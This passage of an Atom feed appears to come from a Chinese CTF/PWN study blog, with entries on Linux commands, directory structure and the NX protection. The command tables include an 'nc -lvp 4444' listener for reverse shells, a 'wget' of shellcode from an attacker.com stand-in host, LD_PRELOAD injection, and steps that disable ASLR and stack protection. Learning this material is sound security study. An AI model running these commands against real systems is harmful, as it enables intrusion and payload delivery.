    <category term="1-二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="3-ELF 文件链接" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/3-ELF-%E6%96%87%E4%BB%B6%E9%93%BE%E6%8E%A5/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/07/e95b91c59fd3.html"/>
    <id>https://rhea006.github.io/2025/07/e95b91c59fd3.html</id>
    <published>2025-07-01T03:47:19.493Z</published>
    <updated>2025-07-01T03:47:19.907Z</updated>
    
    <content type="html"><![CDATA[<p>title: 可执行文件装载与虚拟内存<br>date: 2025-06-28 20:16:36<br>categories:   - PWN -ELF文件格式</p><p>tags: </p><p><img src="/./../../../../../images/image-20250629232102031.png" alt="image-20250629232102031"></p><p><img src="/./../../../../../images/image-20250629232917087.png" alt="image-20250629232917087"></p><p><img src="/./../../../../../images/image-20250629233100682.png" alt="image-20250629233100682"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 可执行文件装载与虚拟内存&lt;br&gt;date: 2025-06-28 20:16:36&lt;br&gt;categories:   - PWN -ELF文件格式&lt;/p&gt;
&lt;p&gt;tags: &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/./../../../../../images/</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="1-二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="2-ELF文件格式" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/2-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/07/bf16778323fb.html"/>
    <id>https://rhea006.github.io/2025/07/bf16778323fb.html</id>
    <published>2025-07-01T03:47:19.492Z</published>
    <updated>2025-07-01T03:47:19.907Z</updated>
    
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="1-二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="1-从源代码到可执行文件" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/1-%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/07/877c6e4ae0f9.html"/>
    <id>https://rhea006.github.io/2025/07/877c6e4ae0f9.html</id>
    <published>2025-07-01T03:18:46.609Z</published>
    <updated>2025-07-01T03:18:46.839Z</updated>
    
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="2-汇编基础" scheme="https://rhea006.github.io/categories/PWN/Learning/2-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    
    <category term="CPU架构与指令集" scheme="https://rhea006.github.io/categories/PWN/Learning/2-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/CPU%E6%9E%B6%E6%9E%84%E4%B8%8E%E6%8C%87%E4%BB%A4%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux常用命令</title>
    <link href="https://rhea006.github.io/2025/07/719992c35129.html"/>
    <id>https://rhea006.github.io/2025/07/719992c35129.html</id>
    <published>2025-07-01T02:00:00.000Z</published>
    <updated>2025-07-04T09:53:35.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="终端命令格式"><a href="#终端命令格式" class="headerlink" title="终端命令格式"></a>终端命令格式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> [-options] [parameter]</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>·command ：命令名，相应功能的英文单词或单词的缩写<br>·[-options] ：选项，可用来对命令进行控制，也可以省略<br>·parameter ：传给命令的参数，可以是 零个、一个 或者 多个</p><h2 id="目录操作命令-cd、pwd、ls、mkdir、rmdir、du"><a href="#目录操作命令-cd、pwd、ls、mkdir、rmdir、du" class="headerlink" title="目录操作命令 cd、pwd、ls、mkdir、rmdir、du"></a>目录操作命令 cd、pwd、ls、mkdir、rmdir、du</h2><table><thead><tr><th>命令 &#x2F; 选项组合</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>基础命令</strong></td><td></td></tr><tr><td><code>cd</code></td><td>切换到另一个目录</td></tr><tr><td><code>pwd</code></td><td>打印当前所在目录（print working directory ）</td></tr><tr><td><code>ls</code></td><td>列出目录内容</td></tr><tr><td><strong><code>ls</code> 常用选项</strong></td><td></td></tr><tr><td><code>ls -l</code></td><td>长格式输出文件，一个文件显示一行（简写 <code>ll</code> ）</td></tr><tr><td><code>ls -a</code></td><td>显示以 <code>.</code> 开头的隐藏文件（默认不显示隐藏文件 ）</td></tr><tr><td><code>ls -d</code></td><td>显示目录本身，而非目录下的文件（默认目录会展开显示内容 ）</td></tr><tr><td><code>ls -lh</code></td><td>长格式输出 + 字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><code>ls -t</code></td><td>按<strong>修改时间从晚到早</strong>排序文件（最近修改的先显示 ）</td></tr><tr><td><code>ls -tr</code></td><td>按<strong>修改时间从早到晚</strong>排序文件（最近修改的后显示 ）</td></tr><tr><td><code>ls -R</code></td><td>递归列出当前目录及所有子目录的文件（遍历嵌套目录 ）</td></tr><tr><td><strong>个人常用 <code>ls</code> 用法</strong></td><td><code>ll -ah</code> （长格式 + 显示隐藏文件 + 人性化字节数 ）</td></tr><tr><td><strong><code>mkdir</code></strong></td><td>创建目录；<code>-p</code> 选项可级联创建多层目录（如 <code>mkdir -p a/b/c</code> ）</td></tr><tr><td><strong><code>rmdir</code></strong></td><td>删除空目录；非空目录需用 <code>rm -rf 目录名</code> 强制删除（谨慎使用 <code>rm -rf</code> ）</td></tr><tr><td><strong><code>du</code> 命令及选项</strong></td><td></td></tr><tr><td><code>du</code></td><td>统计目录 &#x2F; 文件的磁盘占用字节数</td></tr><tr><td><code>du -s</code></td><td>只显示总字节数（不展开子文件 &#x2F; 目录 ）</td></tr><tr><td><code>du -h</code></td><td>字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><strong>个人常用 <code>du</code> 用法</strong></td><td><code>du -sh</code> （统计总占用 + 人性化字节数 ）</td></tr></tbody></table><h2 id="文件操作命令-which、touch、cp、mv、rm、file"><a href="#文件操作命令-which、touch、cp、mv、rm、file" class="headerlink" title="文件操作命令 which、touch、cp、mv、rm、file"></a>文件操作命令 which、touch、cp、mv、rm、file</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>功能说明</strong></th><th><strong>语法示例</strong></th><th><strong>关键参数 &#x2F; 补充</strong></th></tr></thead><tbody><tr><td><code>which</code></td><td>查找命令在系统中的绝对路径</td><td><code>which cd</code> <code>which ls</code> <code>which date</code></td><td>- 仅查系统 <code>PATH</code> 路径内的可执行命令</td></tr><tr><td><code>touch</code></td><td>创建空文件 &#x2F; 更新文件修改时间</td><td><code>touch /root/aaa /root/bbb /root/ccc</code></td><td>- 无文件则创建，有文件则改<strong>修改时间</strong></td></tr><tr><td><code>cp</code></td><td>复制文件 &#x2F; 目录</td><td>复制文件： <code>cp /root/install.log /tmp</code> <code>cp /root/install.log /tmp/abc.log</code> 复制目录： <code>cp -R /root /tmp</code> <code>cp -R /root /tmp/abc</code></td><td><code>-R</code>：递归复制目录（必加） <code>-i</code>：覆盖前提示（默认隐藏，需手动开）</td></tr><tr><td><code>mv</code></td><td>移动文件 &#x2F; 目录 &#x2F; 重命名</td><td>移动： <code>mv /root/install.log.bak /tmp</code> 重命名： <code>mv /tmp/root /tmp/root1</code></td><td>- 移动 + 重命名可一步完成（如 <code>mv 旧路径 新路径</code> ）</td></tr><tr><td><code>rm</code></td><td>删除文件 &#x2F; 目录（<strong>危险操作</strong>）</td><td>删除文件： <code>rm /root/install.log.bak</code> 删除目录： <code>rm -rf /tmp/root1</code></td><td><code>-r</code>：递归删目录内容 <code>-f</code>：强制删除（无提示） <code>-i</code>：删除前逐一确认（建议日常用）</td></tr><tr><td><code>file</code></td><td>查看文件的类型（格式 &#x2F; 编码等）</td><td><code>file 文件名</code> 例：<code>file /root/install.log</code></td><td>- 可识别文本、二进制、压缩包等类型</td></tr></tbody></table><h2 id="查看登录用户命名-who、w"><a href="#查看登录用户命名-who、w" class="headerlink" title="查看登录用户命名 who、w"></a>查看登录用户命名 who、w</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>who</strong></td><td><strong>当前用户登录的信息</strong></td></tr><tr><td><strong>w</strong></td><td><strong>当前用户登录的信息，以什么程序登录的</strong></td></tr></tbody></table><h2 id="文件内容查看命令-cat、tac、more、less、tail、head"><a href="#文件内容查看命令-cat、tac、more、less、tail、head" class="headerlink" title="文件内容查看命令 cat、tac、more、less、tail、head"></a>文件内容查看命令 cat、tac、more、less、tail、head</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>cat</td><td>查看文本文件内容，将文本文件内容全部打印到标准输出 选项 -n 输出结果带行号</td></tr><tr><td>tac</td><td>查看文本文件内容，倒序输出 按照行号倒序打印文本文件的内容</td></tr><tr><td>more</td><td>分页显示文件内容，例如：more &#x2F;root&#x2F;install.log 默认显示进度百分比 空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>less</td><td>分页显示文件内容，例如：less &#x2F;root&#x2F;install.log 选项 -m 显示进度百分比 可以用“&#x2F;”后跟关键字搜索文件内容 空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>tail</td><td>查看文件尾部10行，例如：tail &#x2F;root&#x2F;install.log 选项-N （N为正整数）可以指定显示末尾N行内容</td></tr><tr><td>head</td><td>查看文件头部10行，例如：head &#x2F;root&#x2F;install.log 选项-N （N为正整数）可以指定显示头部N行内容</td></tr></tbody></table><h2 id="系统管理类命令-shutdown、reboot、lscpu"><a href="#系统管理类命令-shutdown、reboot、lscpu" class="headerlink" title="系统管理类命令 shutdown、reboot、lscpu"></a>系统管理类命令 shutdown、reboot、lscpu</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>shutdown</strong></td><td><strong>关机命令</strong> <strong>shutdown -h now 立刻关机</strong> <strong>shutdown -h +10 “10分钟后关机”，每个登录用户收到“10分钟后关机”的消息，并于10分钟后关机</strong> <strong>shutdown -c 取消关机</strong></td></tr><tr><td><strong>reboot</strong></td><td><strong>重启系统</strong></td></tr><tr><td><strong>lscpu</strong></td><td><strong>查看系统cpu信息</strong></td></tr></tbody></table><h1 id="查阅命令帮助信息"><a href="#查阅命令帮助信息" class="headerlink" title="查阅命令帮助信息"></a>查阅命令帮助信息</h1><h2 id="help"><a href="#help" class="headerlink" title="-help"></a>-help</h2><p>说明：显示 command 命令的帮助信息</p><h2 id="man"><a href="#man" class="headerlink" title="-man"></a>-man</h2><p>说明：</p><p>·查阅 command 命令的使用手册（man 是 manual 的缩写，是 Linux 提供的一个 手册，包含了绝大部分的命令、函数的详细使用）<br>·说明：使用 man 时的操作键</p><table><thead><tr><th>操作键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示手册页的下一屏</td></tr><tr><td>Enter 键</td><td>一次滚动手册页的一行</td></tr><tr><td>b</td><td>回滚一屏</td></tr><tr><td>f</td><td>前滚一屏</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>&#x2F;word</td><td>搜索 word 字符串</td></tr></tbody></table><h1 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全:"></a>自动补全:</h1><p>在敲出 文件 ／ 目录 ／ 命令 的前几个字母之后，按下 tab 键</p><p>如果输入的没有歧义，系统会自动补全<br>如果还存在其他 文件 ／ 目录 ／ 命令 ，再按一下 tab 键，系统会提示可能存在的命令<br>小技巧</p><p><strong><code>小技巧：</code></strong></p><p>ctrl + shift + &#x3D; 放大终端窗口的字体显示<br>ctrl + - 缩小终端窗口的字体显示</p><p>按 上 ／ 下 光标键可以在曾经使用过的命令之间来回切换<br>如果想要退出选择，并且不想执行当前选中的命令，可以按 ctrl + c</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="文件分析命令（关键！）"><a href="#文件分析命令（关键！）" class="headerlink" title="文件分析命令（关键！）"></a>文件分析命令（关键！）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>file</code></strong></td><td>查看文件类型</td><td><code>file ./vuln</code></td><td>识别ELF类型（32&#x2F;64位）、动态&#x2F;静态链接</td></tr><tr><td><strong><code>checksec</code></strong></td><td>检查安全机制</td><td><code>checksec --file=./vuln</code></td><td>查看NX, PIE, Canary, RELRO等防护状态</td></tr><tr><td><strong><code>readelf</code></strong></td><td>ELF文件分析</td><td><code>readelf -a ./vuln</code></td><td>查看节头、符号表、重定位表、程序头</td></tr><tr><td><code>readelf -S</code></td><td>查看节头信息</td><td><code>readelf -S ./vuln</code></td><td>定位.text&#x2F;.plt&#x2F;.got等关键段地址</td></tr><tr><td><code>readelf -s</code></td><td>查看符号表</td><td>&#96;readelf -s .&#x2F;vuln</td><td>grep system&#96;</td></tr><tr><td><strong><code>objdump</code></strong></td><td>反汇编分析</td><td><code>objdump -d ./vuln</code></td><td>反汇编代码段</td></tr><tr><td><code>objdump -M</code></td><td>指定反汇编格式</td><td><code>objdump -M intel -d ./vuln</code></td><td>Intel格式反汇编（更易读）</td></tr><tr><td><code>objdump -j</code></td><td>反汇编特定段</td><td><code>objdump -j .plt -d ./vuln</code></td><td>分析PLT表</td></tr><tr><td><strong><code>strings</code></strong></td><td>提取字符串</td><td>&#96;strings .&#x2F;vuln</td><td>grep “&#x2F;bin&#x2F;sh”&#96;</td></tr><tr><td><strong><code>ldd</code></strong></td><td>查看动态依赖</td><td><code>ldd ./vuln</code></td><td>获取libc路径和基址偏移</td></tr></tbody></table><h2 id="调试分析命令（核心工具）"><a href="#调试分析命令（核心工具）" class="headerlink" title="调试分析命令（核心工具）"></a>调试分析命令（核心工具）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>gdb</code></strong></td><td>GNU调试器</td><td><code>gdb ./vuln</code></td><td>动态调试分析</td></tr><tr><td><code>gdb -p</code></td><td>附加进程</td><td><code>gdb -p &lt;pid&gt;</code></td><td>调试运行中的程序</td></tr><tr><td><code>gdb -ex</code></td><td>执行命令</td><td><code>gdb -ex &quot;b main&quot; -ex &quot;r&quot; ./vuln</code></td><td>自动化调试任务</td></tr><tr><td><strong><code>strace</code></strong></td><td>系统调用跟踪</td><td><code>strace ./vuln</code></td><td>监控系统调用（如execve）</td></tr><tr><td><strong><code>ltrace</code></strong></td><td>库函数跟踪</td><td><code>ltrace ./vuln</code></td><td>监控库函数调用（如malloc）</td></tr><tr><td><strong><code>pwndbg</code></strong></td><td>增强版GDB</td><td>-</td><td>专为Pwn设计的GDB插件</td></tr><tr><td><code>info proc</code></td><td>查看进程信息</td><td><code>info proc mappings</code></td><td>查看内存映射布局</td></tr></tbody></table><h2 id="网络操作命令（漏洞利用必备）"><a href="#网络操作命令（漏洞利用必备）" class="headerlink" title="网络操作命令（漏洞利用必备）"></a>网络操作命令（漏洞利用必备）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>nc</code></strong></td><td>网络工具</td><td><code>nc -lvp 4444</code></td><td>监听端口（接收反弹shell）</td></tr><tr><td></td><td></td><td><code>nc 192.168.1.100 1337</code></td><td>连接远程漏洞服务</td></tr><tr><td><strong><code>socat</code></strong></td><td>高级网络工具</td><td><code>socat TCP-LISTEN:4444,reuseaddr,fork EXEC:./vuln</code></td><td>稳定连接（用于ROP链开发）</td></tr><tr><td><strong><code>curl</code></strong></td><td>HTTP客户端</td><td><code>curl http://target:8080/exploit</code></td><td>Web Pwn题利用</td></tr><tr><td><strong><code>wget</code></strong></td><td>文件下载</td><td><code>wget http://attacker.com/shellcode.bin</code></td><td>下载远程payload</td></tr></tbody></table><h2 id="进程管理命令"><a href="#进程管理命令" class="headerlink" title="进程管理命令"></a>进程管理命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>ps</code></strong></td><td>查看进程</td><td>&#96;ps aux</td><td>grep vuln&#96;</td></tr><tr><td><strong><code>kill</code></strong></td><td>终止进程</td><td><code>kill -9 &lt;pid&gt;</code></td><td>强制结束崩溃的程序</td></tr><tr><td><strong><code>pkill</code></strong></td><td>按名杀进程</td><td><code>pkill -f vuln</code></td><td>快速结束目标程序</td></tr><tr><td><strong><code>top</code></strong></td><td>实时进程监控</td><td><code>top</code></td><td>监控资源占用情况</td></tr><tr><td><strong><code>nohup</code></strong></td><td>后台运行</td><td><code>nohup ./vuln &amp;</code></td><td>保持服务运行</td></tr></tbody></table><h2 id="环境配置命令"><a href="#环境配置命令" class="headerlink" title="环境配置命令"></a>环境配置命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>export</code></strong></td><td>环境变量</td><td><code>export LD_PRELOAD=./libc.so.6</code></td><td>预加载库（库注入攻击）</td></tr><tr><td></td><td></td><td><code>export PYTHONPATH=/path/to/pwntools</code></td><td>设置Python路径</td></tr><tr><td><strong><code>ulimit</code></strong></td><td>资源限制</td><td><code>ulimit -c unlimited</code></td><td>启用core dump</td></tr><tr><td><strong><code>setarch</code></strong></td><td>设置架构</td><td><code>setarch </code>uname -m<code> -R ./vuln</code></td><td>禁用ASLR（地址随机化）</td></tr><tr><td><strong><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></strong></td><td>全局禁用ASLR</td><td>需要root权限</td><td>调试环境配置</td></tr></tbody></table><h2 id="二进制处理命令"><a href="#二进制处理命令" class="headerlink" title="二进制处理命令"></a>二进制处理命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>xxd</code></strong></td><td>十六进制查看</td><td>&#96;xxd .&#x2F;vuln</td><td>head&#96;</td></tr><tr><td><strong><code>hexedit</code></strong></td><td>十六进制编辑</td><td><code>hexedit ./vuln</code></td><td>手动修改二进制文件</td></tr><tr><td><strong><code>patchelf</code></strong></td><td>ELF修补</td><td><code>patchelf --set-interpreter /lib/ld-linux.so.2 ./vuln</code></td><td>修改动态链接器</td></tr><tr><td></td><td></td><td><code>patchelf --replace-needed libc.so.6 ./libc_target.so ./vuln</code></td><td>替换依赖库</td></tr><tr><td><strong><code>objcopy</code></strong></td><td>目标文件操作</td><td><code>objcopy --dump-section .text=text.bin ./vuln</code></td><td>提取代码段</td></tr></tbody></table><h2 id="开发辅助命令"><a href="#开发辅助命令" class="headerlink" title="开发辅助命令"></a>开发辅助命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>python</code></strong></td><td>Python解释器</td><td><code>python3 exploit.py</code></td><td>运行漏洞利用脚本</td></tr><tr><td><strong><code>pip</code></strong></td><td>Python包管理</td><td><code>pip install pwntools</code></td><td>安装Pwn工具库</td></tr><tr><td><strong><code>gcc</code></strong></td><td>编译器</td><td><code>gcc -fno-stack-protector -z execstack vuln.c -o vuln</code></td><td>编译含漏洞程序</td></tr><tr><td><strong><code>make</code></strong></td><td>构建工具</td><td><code>make</code></td><td>编译CTF题目</td></tr><tr><td><strong><code>tmux</code></strong></td><td>终端复用器</td><td><code>tmux new -s pwn</code></td><td>管理多个调试窗口</td></tr></tbody></table><h2 id="信息搜索命令"><a href="#信息搜索命令" class="headerlink" title="信息搜索命令"></a>信息搜索命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>grep</code></strong></td><td>文本搜索</td><td>&#96;objdump -d .&#x2F;vuln</td><td>grep “call”&#96;</td></tr><tr><td><strong><code>find</code></strong></td><td>文件查找</td><td><code>find / -name &quot;libc.so.6&quot; 2&gt;/dev/null</code></td><td>查找libc库</td></tr><tr><td><strong><code>which</code></strong></td><td>命令定位</td><td><code>which gdb</code></td><td>查找工具路径</td></tr><tr><td><strong><code>man</code></strong></td><td>手册查看</td><td><code>man 2 execve</code></td><td>查看系统调用文档</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;终端命令格式&quot;&gt;&lt;a href=&quot;#终端命令格式&quot; class=&quot;headerlink&quot; title=&quot;终端命令格式&quot;&gt;&lt;/a&gt;终端命令格式&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="6-Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/6-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="1-Linux基础" scheme="https://rhea006.github.io/categories/PWN/Learning/6-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1-Linux%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux目录结构</title>
    <link href="https://rhea006.github.io/2025/07/b5cdfe52dd80.html"/>
    <id>https://rhea006.github.io/2025/07/b5cdfe52dd80.html</id>
    <published>2025-07-01T02:00:00.000Z</published>
    <updated>2025-07-04T09:53:35.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="根目录的子目录"><a href="#根目录的子目录" class="headerlink" title="根目录的子目录"></a>根目录的子目录</h1><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>bin是Binary的缩写, 这个目录存放着最经常使用的命令，由系统、系统管理员和用户共享</td></tr><tr><td>&#x2F;boot</td><td>这里存放的是启动Linux时使用的一些核心文件，包括一些链接文件以及镜像文件</td></tr><tr><td>&#x2F;dev</td><td>dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的</td></tr><tr><td>&#x2F;etc</td><td>大多数重要的系统配置文件都在&#x2F;etc目录下，该目录包含的数据类似于Windows控制面板中的数据</td></tr><tr><td>&#x2F;home</td><td>普通用户的家目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的</td></tr><tr><td>&#x2F;lib</td><td>库文件，包括系统和用户所需要的各种程序的文件</td></tr><tr><td>&#x2F;lost+found</td><td>每个分区在其上目录中都有一个lost+found。故障期间保存的文件在这里</td></tr><tr><td>&#x2F;media</td><td>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下</td></tr><tr><td>&#x2F;mnt</td><td>外部文件系统的标准挂载点，例如CD-ROM(光驱)或数码相机</td></tr><tr><td>&#x2F;opt</td><td>通常包含额外的和第三方软件。这是给主机额外安装的大型应用程序所放置的目录</td></tr><tr><td>&#x2F;proc</td><td>包含有关系统资源信息的虚拟文件系统。这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件&lt;</td></tr><tr><td>&#x2F;root</td><td>该目录为系统管理员，也称作超级权限者的用户家目录。注意根目录 &#x2F; 和根用户的主目录 &#x2F;root 之间的区别</td></tr><tr><td>&#x2F;sbin</td><td>s就是Super User的意思，这里存放的是系统管理员root使用的系统管理程序</td></tr><tr><td>&#x2F;tmp</td><td>系统使用的临时空间，在重新启动时清理，所以不要使用它来保存任何工作!该目录对于所有用户都可以访问，不要把重要文件放置于该目录</td></tr><tr><td>&#x2F;usr</td><td>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似与windows下的program files目录</td></tr><tr><td>&#x2F;var</td><td>用户创建的所有可变文件和临时文件的存储空间，如日志文件(一般是&#x2F;var&#x2F;log)、邮件队列、打印假脱机程序区、从Internet下载的文件的临时存储空间，或在刻录CD之前保存它的映像。</td></tr></tbody></table><h1 id="Linux绝对路径和相对路径"><a href="#Linux绝对路径和相对路径" class="headerlink" title="Linux绝对路径和相对路径"></a>Linux绝对路径和相对路径</h1><h2 id="绝对路径："><a href="#绝对路径：" class="headerlink" title="绝对路径："></a>绝对路径：</h2><p>以根目录“&#x2F;”开始的路径，表示从Linux目录结构的最顶点算起，特点是路径以“&#x2F;”开头</p><h2 id="相对路径："><a href="#相对路径：" class="headerlink" title="相对路径："></a>相对路径：</h2><p>不以根目录“&#x2F;”开始的路径，以当前目录作为起始点，特点是不以“&#x2F;”开头</p><p>每个目录下都有”.”和”..”2个目录：</p><p>一个点“ . ”代表当前目录，写全了“ .&#x2F; ”</p><p>二个点“ .. ”代表上一级目录，写全了“ ..&#x2F; ”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;根目录的子目录&quot;&gt;&lt;a href=&quot;#根目录的子目录&quot; class=&quot;headerlink&quot; title=&quot;根目录的子目录&quot;&gt;&lt;/a&gt;根目录的子目录&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;目录&lt;/th&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="6-Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/6-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="1-Linux基础" scheme="https://rhea006.github.io/categories/PWN/Learning/6-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1-Linux%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>NX</title>
    <link href="https://rhea006.github.io/2025/07/a60a3429e0bc.html"/>
    <id>https://rhea006.github.io/2025/07/a60a3429e0bc.html</id>
    <published>2025-07-01T02:00:00.000Z</published>
    <updated>2025-07-04T09:53:35.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p> No-eXecute(NX)，表示不可执行，其原理是将数据所在的内存页(例如堆和栈)标识为不可执行，如果程序产生溢出转入执行shellcode时，CPU就会抛出异常。通常我们使用可执行空间保护(executable space protection)作为一个统称，来描述这种防止传统代码注入攻击的技术——攻击者将恶意代码注入正在运行的程序中，然后使用内存损坏漏洞将控制流重定向到该代码。实施这种保护的技术有多种名称，在 Windows上称为数据执行保护(DEP)，在Linux上则有 NX、WX、Pax和 Exec Shield 等。</p><p> NX的实现需要结合软件和硬件共同完成。首先在硬件层面，它利用处理器的NX位，对相应页表项中的第63位进行设置，设置为1表示内容不可执行，设置为0则表示内容可执行。一旦程序计数器(PC)被放到受保护的页面内，就会触发硬件层面的异常。其次，在软件层面，操作系统需要支持 NX，以便正确配置页表，但有时这会给自修改代码或者动态生成的代码(JT编译代码)带来一些问题，这在浏览器上很常见。这时，软件需要使用适当的API来分配内存，例如Wimdows上使用 VirtualProtect 或 VirtualAlloc,Linux上使用mprotect或者 mmap，这些 API 允许更改已分配页面的保护级别。</p><p> 在 Linux 中，当装载器将程序装载进内存空间后，将程序的.text节标记为可执行，而其余的数据段(.data、.bss等)以及栈、堆均为不可执行。因此，传统的通过修改GOT来执行shellcode 的方式不再可行。但NX这种保护并不能阻止攻击者通过代码重用来进行攻击(ret2libc)。</p><p> 如下所示，Ubuntu 中已经默认启用了NX。GNUSTACK段在禁用NX时权限为RWE，而开启<br>后权限仅为 RW，不可执行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc zexecstack hello,c &amp;&amp; readelf -l a.out | grep-A1 GNU STACK # 禁用</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt; No-eXecute(NX)，表示不可执行，其原理是将数据所在的内存页(例如堆和栈)标识为不可执行，如果程序产生溢出转入执行shellco</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="6-Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/6-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
